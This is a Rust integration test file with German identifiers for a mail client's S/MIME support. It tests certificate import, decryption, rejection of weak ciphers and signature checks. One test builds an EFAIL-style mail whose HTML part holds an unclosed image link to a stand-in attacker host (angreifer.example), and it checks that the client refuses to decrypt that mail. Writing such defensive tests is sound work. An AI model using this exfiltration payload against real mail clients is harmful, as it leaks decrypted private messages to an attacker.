//! Integrationstests S/MIME (#56): Zertifikate importieren, Mails entschlüsseln und Signaturen
//! prüfen.
//!
//! Die Test-PKI in `tests/integration/daten/smime/` wurde eigens dafür erzeugt (siehe
//! LIESMICH.md dort). Testmails baut dieser Test selbst mit OpenSSL; nur Mails mit unsicheren
//! Verfahren (RC2, DES, MD5) liegen fertig bei, weil die mitgelieferte OpenSSL sie nicht mehr
//! erzeugen kann.

use std::sync::Arc;

use base64::Engine;
use openssl::cms::{CMSOptions, CmsContentInfo};
use openssl::pkey::PKey;
use openssl::stack::Stack;
use openssl::symm::Cipher;
use openssl::x509::X509;
use sichermail_lib::konto::schluesselbund::{Schluesselbund, SpeicherSchluesselbund};
use sichermail_lib::pgp::lesen::{Signatur, Verfahren, Verschluesselung};
use sichermail_lib::pgp::speicher::SchluesselDb;
use sichermail_lib::smime::lesen::{CBC_HINWEIS, SPERRSTATUS_HINWEIS};
use sichermail_lib::smime::{zertifikat, SmimeDienst};

const PASSWORT: &str = "test-passwort";

fn daten(name: &str) -> Vec<u8> {
    std::fs::read(format!(
        "{}/../tests/integration/daten/smime/{name}",
        env!("CARGO_MANIFEST_DIR")
    ))
    .unwrap()
}

fn zert(name: &str) -> X509 {
    X509::from_pem(&daten(&format!("{name}.pem"))).unwrap()
}

/// Neuer Dienst ohne Systemwurzeln (die Tests sollen nicht vom Rechner abhängen).
fn dienst(ordner: &std::path::Path, bund: Arc<dyn Schluesselbund>) -> SmimeDienst {
    SmimeDienst::mit_systemwurzeln(Arc::new(SchluesselDb::neu(ordner, bund)), false)
}

/// Dienst mit Annas Zertifikat (entsperrt) und übernommener Test-Wurzel.
fn dienst_fuer_anna(ordner: &std::path::Path) -> SmimeDienst {
    let d = dienst(ordner, Arc::new(SpeicherSchluesselbund::default()));
    d.eigenes_importieren("k1", "anna@example.org", &daten("anna.p12"), PASSWORT)
        .unwrap();
    wurzel_uebernehmen(&d);
    d
}

fn wurzel_uebernehmen(d: &SmimeDienst) {
    let info = d.wurzel_lesen(&daten("test-ca.pem")).unwrap();
    assert_eq!(info.name, "SicherMail Test-Wurzel");
    d.wurzel_bestaetigen(&info.fingerabdruck).unwrap();
}

fn kopf(von: &str) -> String {
    format!(
        "From: {von}\r\nTo: Anna Test <anna@example.org>\r\nSubject: Geheim\r\nDate: Mon, 19 Oct 2026 10:00:00 +0200\r\nMessage-ID: <smime-test@example.org>\r\nMIME-Version: 1.0\r\n"
    )
}

const BEA: &str = "Bea Test <bea@example.org>";

const INHALT: &str =
    "Content-Type: text/plain; charset=utf-8\r\nContent-Transfer-Encoding: 8bit\r\n\r\nHallo Anna, das ist geheim.\r\n";

fn base64_zeilen(daten: &[u8]) -> String {
    let text = base64::engine::general_purpose::STANDARD.encode(daten);
    text.as_bytes()
        .chunks(76)
        .map(|z| std::str::from_utf8(z).unwrap())
        .collect::<Vec<_>>()
        .join("\r\n")
}

fn pkcs7_mime(von: &str, smime_typ: &str, der: &[u8]) -> String {
    format!(
        "{}Content-Type: application/pkcs7-mime; smime-type={smime_typ}; name=\"smime.p7m\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"smime.p7m\"\r\n\r\n{}\r\n",
        kopf(von),
        base64_zeilen(der)
    )
}

/// Verschlüsselt eine MIME-Entität an Anna.
fn verschluesselt(von: &str, entitaet: &str, verfahren: Cipher) -> String {
    let mut empfaenger = Stack::new().unwrap();
    empfaenger.push(zert("anna")).unwrap();
    let gcm = verfahren.nid() == Cipher::aes_256_gcm().nid();
    let cms = CmsContentInfo::encrypt(
        &empfaenger,
        entitaet.as_bytes(),
        verfahren,
        CMSOptions::BINARY,
    )
    .unwrap();
    let typ = if gcm {
        "authEnveloped-data"
    } else {
        "enveloped-data"
    };
    pkcs7_mime(von, typ, &cms.to_der().unwrap())
}

/// Signiert eine Entität als `name` (Zertifikat und Schlüssel aus den Testdaten).
fn signatur(name: &str, entitaet: &[u8], abgetrennt: bool) -> Vec<u8> {
    let zertifikat = zert(name);
    let schluessel = PKey::private_key_from_pem(&daten(&format!("{name}.key"))).unwrap();
    let mut kette = Stack::new().unwrap();
    let aussteller = if name == "bea-fremd" {
        "fremd-ca"
    } else {
        "zwischen"
    };
    kette.push(zert(aussteller)).unwrap();
    let mut optionen = CMSOptions::BINARY;
    if abgetrennt {
        optionen |= CMSOptions::DETACHED;
    }
    CmsContentInfo::sign(
        Some(&zertifikat),
        Some(&schluessel),
        Some(&kette),
        Some(entitaet),
        optionen,
    )
    .unwrap()
    .to_der()
    .unwrap()
}

/// `multipart/signed` (abgetrennte Signatur).
fn signiert_entitaet(name: &str, inhalt: &str) -> String {
    let p7s = signatur(name, inhalt.as_bytes(), true);
    format!(
        "Content-Type: multipart/signed; protocol=\"application/pkcs7-signature\"; micalg=sha-256; boundary=\"grenze\"\r\n\r\n\
--grenze\r\n{inhalt}\r\n--grenze\r\nContent-Type: application/pkcs7-signature; name=\"smime.p7s\"\r\nContent-Transfer-Encoding: base64\r\n\r\n{}\r\n--grenze--\r\n",
        base64_zeilen(&p7s)
    )
}

fn signiert(von: &str, name: &str) -> String {
    format!("{}{}", kopf(von), signiert_entitaet(name, INHALT))
}

fn text(roh: &[u8]) -> String {
    String::from_utf8_lossy(roh).into_owned()
}

#[test]
fn eigenes_zertifikat_importieren() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst(ordner.path(), Arc::new(SpeicherSchluesselbund::default()));

    let fremde_adresse = d
        .eigenes_importieren("k1", "anna@example.org", &daten("eve.p12"), PASSWORT)
        .unwrap_err();
    assert!(
        fremde_adresse
            .meldung
            .contains("passt nicht zu diesem Konto")
            && fremde_adresse.meldung.contains("eve@example.org"),
        "{}",
        fremde_adresse.meldung
    );
    let falsches_passwort = d
        .eigenes_importieren("k1", "anna@example.org", &daten("anna.p12"), "falsch")
        .unwrap_err();
    assert!(falsches_passwort.meldung.contains("Passwort ist falsch"));
    let schwach = d
        .eigenes_importieren(
            "k1",
            "anna@example.org",
            &daten("anna-schwach.p12"),
            PASSWORT,
        )
        .unwrap_err();
    assert!(
        schwach.meldung.contains("zu schwach"),
        "{}",
        schwach.meldung
    );
    let server = d
        .eigenes_importieren(
            "k1",
            "anna@example.org",
            &daten("anna-server.p12"),
            PASSWORT,
        )
        .unwrap_err();
    assert!(
        server.meldung.contains("nicht für Mails"),
        "{}",
        server.meldung
    );
    assert!(d.uebersicht().unwrap().eigene.is_empty());

    let info = d
        .eigenes_importieren("k1", "Anna@Example.org", &daten("anna.p12"), PASSWORT)
        .unwrap();
    assert_eq!(info.adressen, vec!["anna@example.org"]);
    assert_eq!(info.aussteller, "SicherMail Test-Zwischenstelle");
    assert!(!info.abgelaufen);
    let uebersicht = d.uebersicht().unwrap();
    assert_eq!(uebersicht.eigene.len(), 1);
    assert_eq!(uebersicht.eigene[0].konto, "k1");
    assert!(uebersicht.eigene[0].entsperrt);
}

#[test]
fn zertifikate_anderer_und_wurzeln_verwalten() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst(ordner.path(), Arc::new(SpeicherSchluesselbund::default()));
    let infos = d.fremde_importieren(&daten("bea.pem")).unwrap();
    assert_eq!(infos[0].adressen, vec!["bea@example.org"]);
    // DER-Datei (.cer) geht genauso.
    let der = zert("eve").to_der().unwrap();
    assert_eq!(d.fremde_importieren(&der).unwrap()[0].name, "Eve Test");
    // Eine Stelle ist kein Zertifikat einer Person.
    assert!(d.fremde_importieren(&daten("zwischen.pem")).is_err());
    assert!(d.fremde_importieren(b"kein Zertifikat").is_err());
    assert_eq!(d.uebersicht().unwrap().fremde.len(), 2);

    // Wurzel: erst lesen und anzeigen, dann mit Fingerabdruck bestätigen.
    assert!(d.wurzel_lesen(&daten("bea.pem")).is_err());
    let info = d.wurzel_lesen(&daten("test-ca.pem")).unwrap();
    assert!(d.uebersicht().unwrap().wurzeln.is_empty());
    assert!(d.wurzel_bestaetigen("00 11").is_err());
    // Nach einem falschen Fingerabdruck muss neu gelesen werden.
    assert!(d.wurzel_bestaetigen(&info.fingerabdruck).is_err());
    let info = d.wurzel_lesen(&daten("test-ca.pem")).unwrap();
    d.wurzel_bestaetigen(&info.fingerabdruck.to_lowercase())
        .unwrap();
    assert_eq!(d.uebersicht().unwrap().wurzeln, vec![info.clone()]);

    d.loeschen(&info.fingerabdruck).unwrap();
    assert!(d.uebersicht().unwrap().wurzeln.is_empty());
    assert!(d.loeschen(&info.fingerabdruck).is_err());
}

#[test]
fn ganze_mail_entschluesseln_cbc_und_gcm() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());

    let cbc = verschluesselt(BEA, INHALT, Cipher::aes_256_cbc());
    let ergebnis = d.verarbeiten(cbc.as_bytes());
    assert_eq!(ergebnis.status.verfahren, Verfahren::Smime);
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Entschluesselt,
        "{:?}",
        ergebnis.status.meldung
    );
    assert_eq!(ergebnis.status.signatur, Signatur::Keine);
    assert!(ergebnis.status.hinweise.contains(&CBC_HINWEIS.to_string()));
    let anzeige = text(&ergebnis.roh.unwrap());
    assert!(anzeige.contains("Hallo Anna, das ist geheim."));
    assert!(anzeige.contains("Subject: Geheim"));
    assert!(!anzeige.contains("pkcs7-mime"));

    let gcm = verschluesselt(BEA, INHALT, Cipher::aes_256_gcm());
    assert!(gcm.contains("authEnveloped-data"));
    let ergebnis = d.verarbeiten(gcm.as_bytes());
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Entschluesselt,
        "{:?}",
        ergebnis.status.meldung
    );
    assert!(
        ergebnis.status.hinweise.is_empty(),
        "{:?}",
        ergebnis.status.hinweise
    );
    assert!(text(&ergebnis.roh.unwrap()).contains("Hallo Anna"));

    // Signiert, dann verschlüsselt (CBC): kein Hinweis, Signatur gültig.
    let innen = signiert_entitaet("bea", INHALT);
    let ergebnis = d.verarbeiten(verschluesselt(BEA, &innen, Cipher::aes_128_cbc()).as_bytes());
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Entschluesselt
    );
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(!ergebnis.status.hinweise.contains(&CBC_HINWEIS.to_string()));
    let anzeige = text(&ergebnis.roh.unwrap());
    assert!(anzeige.contains("Hallo Anna"));
    assert!(!anzeige.contains("pkcs7-signature"));
}

#[test]
fn passphrase_nach_neustart_noetig() {
    let ordner = tempfile::tempdir().unwrap();
    let bund: Arc<dyn Schluesselbund> = Arc::new(SpeicherSchluesselbund::default());
    let d = dienst(ordner.path(), bund.clone());
    let info = d
        .eigenes_importieren("k1", "anna@example.org", &daten("anna.p12"), PASSWORT)
        .unwrap();
    drop(d);

    let d = dienst(ordner.path(), bund);
    assert!(!d.uebersicht().unwrap().eigene[0].entsperrt);
    let mail = verschluesselt(BEA, INHALT, Cipher::aes_256_cbc());
    let ergebnis = d.verarbeiten(mail.as_bytes());
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::NichtEntschluesselt
    );
    assert_eq!(
        ergebnis.status.passphrase_fuer,
        Some(info.fingerabdruck.clone())
    );
    assert!(ergebnis.roh.is_none());

    assert!(d.entsperren(&info.fingerabdruck, "falsch").is_err());
    d.entsperren(&info.fingerabdruck, PASSWORT).unwrap();
    let ergebnis = d.verarbeiten(mail.as_bytes());
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Entschluesselt
    );
}

#[test]
fn ohne_passendes_zertifikat_und_teilweise_verschluesselt() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst(ordner.path(), Arc::new(SpeicherSchluesselbund::default()));
    let mail = verschluesselt(BEA, INHALT, Cipher::aes_256_cbc());
    let ergebnis = d.verarbeiten(mail.as_bytes());
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::NichtEntschluesselt
    );
    assert!(ergebnis.status.meldung.unwrap().contains("kein passendes"));

    // Verschlüsselter Teil neben unverschlüsseltem Inhalt: nicht entschlüsseln (EFAIL).
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());
    let mut empfaenger = Stack::new().unwrap();
    empfaenger.push(zert("anna")).unwrap();
    let cms = CmsContentInfo::encrypt(
        &empfaenger,
        INHALT.as_bytes(),
        Cipher::aes_256_cbc(),
        CMSOptions::BINARY,
    )
    .unwrap();
    let teilweise = format!(
        "{}Content-Type: multipart/mixed; boundary=\"gemischt\"\r\n\r\n--gemischt\r\nContent-Type: text/html\r\n\r\n<img src=\"https://angreifer.example/?\r\n--gemischt\r\nContent-Type: application/pkcs7-mime; smime-type=enveloped-data\r\nContent-Transfer-Encoding: base64\r\n\r\n{}\r\n--gemischt--\r\n",
        kopf(BEA),
        base64_zeilen(&cms.to_der().unwrap())
    );
    let ergebnis = d.verarbeiten(teilweise.as_bytes());
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Teilweise
    );
    assert!(ergebnis.roh.is_none());
}

#[test]
fn unsichere_verfahren_werden_abgelehnt() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());
    for (datei, verfahren) in [("unsicher-rc2-40.eml", "RC2"), ("unsicher-des.eml", "DES")] {
        let ergebnis = d.verarbeiten(&daten(datei));
        assert_eq!(
            ergebnis.status.verschluesselung,
            Verschluesselung::NichtEntschluesselt,
            "{datei}"
        );
        let meldung = ergebnis.status.meldung.unwrap();
        assert!(
            meldung.contains(&format!("unsichere Verfahren {verfahren}")),
            "{meldung}"
        );
        assert!(ergebnis.roh.is_none());
    }
    let ergebnis = d.verarbeiten(&daten("unsicher-md5.eml"));
    assert_eq!(ergebnis.status.signatur, Signatur::Ungueltig);
    assert!(ergebnis.status.meldung.unwrap().contains("MD5"));
}

#[test]
fn signaturen_pruefen() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());

    // Gültig: vertrauenswürdige Kette, passender Absender.
    let ergebnis = d.verarbeiten(signiert(BEA, "bea").as_bytes());
    assert_eq!(ergebnis.status.verfahren, Verfahren::Smime);
    assert_eq!(
        ergebnis.status.signatur,
        Signatur::Gueltig,
        "{:?}",
        ergebnis.status
    );
    assert!(!ergebnis.status.signatur_teilweise);
    assert_eq!(
        ergebnis.status.signierer.as_deref(),
        Some("Bea Test <bea@example.org>")
    );
    assert!(ergebnis
        .status
        .hinweise
        .contains(&SPERRSTATUS_HINWEIS.to_string()));
    assert!(ergebnis.status.zertifikat_uebernehmbar);
    let anzeige = text(&ergebnis.roh.unwrap());
    assert!(anzeige.contains("Hallo Anna"));
    assert!(!anzeige.contains("pkcs7-signature"));

    // Opake Signatur (application/pkcs7-mime; smime-type=signed-data)
    let opak = pkcs7_mime(
        BEA,
        "signed-data",
        &signatur("bea", INHALT.as_bytes(), false),
    );
    let ergebnis = d.verarbeiten(opak.as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(text(&ergebnis.roh.unwrap()).contains("Hallo Anna"));

    // Unbekannte Stelle
    let ergebnis = d.verarbeiten(signiert(BEA, "bea-fremd").as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Unbekannt);
    assert!(!ergebnis.status.zertifikat_uebernehmbar);

    // Abgelaufen
    let ergebnis = d.verarbeiten(signiert(BEA, "bea-abgelaufen").as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Abgelaufen);

    // Verändert
    let veraendert = signiert(BEA, "bea").replace("das ist geheim", "das ist GEHEIM");
    let ergebnis = d.verarbeiten(veraendert.as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Ungueltig);

    // Falscher Absender
    let ergebnis = d.verarbeiten(signiert("Eve <eve@example.org>", "bea").as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::AndereAdresse);
    assert!(!ergebnis.status.zertifikat_uebernehmbar);

    // Nur ein Teil signiert
    let teilweise = format!(
        "{}Content-Type: multipart/mixed; boundary=\"gemischt\"\r\n\r\n--gemischt\r\nContent-Type: text/plain\r\n\r\nUnsignierter Zusatz\r\n--gemischt\r\n{}\r\n--gemischt--\r\n",
        kopf(BEA),
        signiert_entitaet("bea", INHALT)
    );
    let ergebnis = d.verarbeiten(teilweise.as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(ergebnis.status.signatur_teilweise);
    assert!(!ergebnis.status.zertifikat_uebernehmbar);
}

#[test]
fn ohne_uebernommene_wurzel_ist_die_stelle_unbekannt() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst(ordner.path(), Arc::new(SpeicherSchluesselbund::default()));
    let ergebnis = d.verarbeiten(signiert(BEA, "bea").as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Unbekannt);
    wurzel_uebernehmen(&d);
    assert_eq!(
        d.verarbeiten(signiert(BEA, "bea").as_bytes())
            .status
            .signatur,
        Signatur::Gueltig
    );
}

#[test]
fn zertifikat_aus_gueltig_signierter_mail_uebernehmen() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());
    assert!(d
        .aus_mail_uebernehmen(signiert(BEA, "bea-fremd").as_bytes())
        .is_err());
    assert!(d
        .aus_mail_uebernehmen(signiert("Eve <eve@example.org>", "bea").as_bytes())
        .is_err());
    let info = d
        .aus_mail_uebernehmen(signiert(BEA, "bea").as_bytes())
        .unwrap();
    assert_eq!(info.adressen, vec!["bea@example.org"]);
    assert_eq!(d.uebersicht().unwrap().fremde, vec![info]);
    // Danach wird es nicht mehr angeboten.
    let ergebnis = d.verarbeiten(signiert(BEA, "bea").as_bytes());
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(!ergebnis.status.zertifikat_uebernehmbar);
}

#[test]
fn openpgp_mails_bleiben_unberuehrt() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());
    let pgp = format!(
        "{}Content-Type: multipart/signed; protocol=\"application/pgp-signature\"; boundary=\"g\"\r\n\r\n--g\r\n{INHALT}\r\n--g\r\nContent-Type: application/pgp-signature\r\n\r\nx\r\n--g--\r\n",
        kopf(BEA)
    );
    let ergebnis = d.verarbeiten(pgp.as_bytes());
    assert!(ergebnis.roh.is_none());
    assert_eq!(ergebnis.status.signatur, Signatur::Keine);
    assert_eq!(ergebnis.status.verfahren, Verfahren::OpenPgp);
}

#[test]
fn fingerabdruck_ist_sha256() {
    let hex = zertifikat::fingerabdruck_hex(&zert("bea"));
    assert_eq!(hex.len(), 64);
    assert_eq!(
        zertifikat::fingerabdruck_normal(&zertifikat::fingerabdruck_anzeige(&hex)),
        hex
    );
}

#[test]
fn mails_von_der_openssl_kommandozeile() {
    let ordner = tempfile::tempdir().unwrap();
    let d = dienst_fuer_anna(ordner.path());
    let ergebnis = d.verarbeiten(&daten("cli-signiert.eml"));
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(text(&ergebnis.roh.unwrap()).contains("Geheimer Testinhalt"));

    // BER mit unbestimmter Länge, innen signiert
    let roh = daten("cli-verschluesselt.eml");
    assert!(
        text(&roh).contains("\r\n\r\nMIAG"),
        "Testmail soll BER enthalten"
    );
    let ergebnis = d.verarbeiten(&roh);
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Entschluesselt,
        "{:?}",
        ergebnis.status.meldung
    );
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(text(&ergebnis.roh.unwrap()).contains("Geheimer Testinhalt"));
}
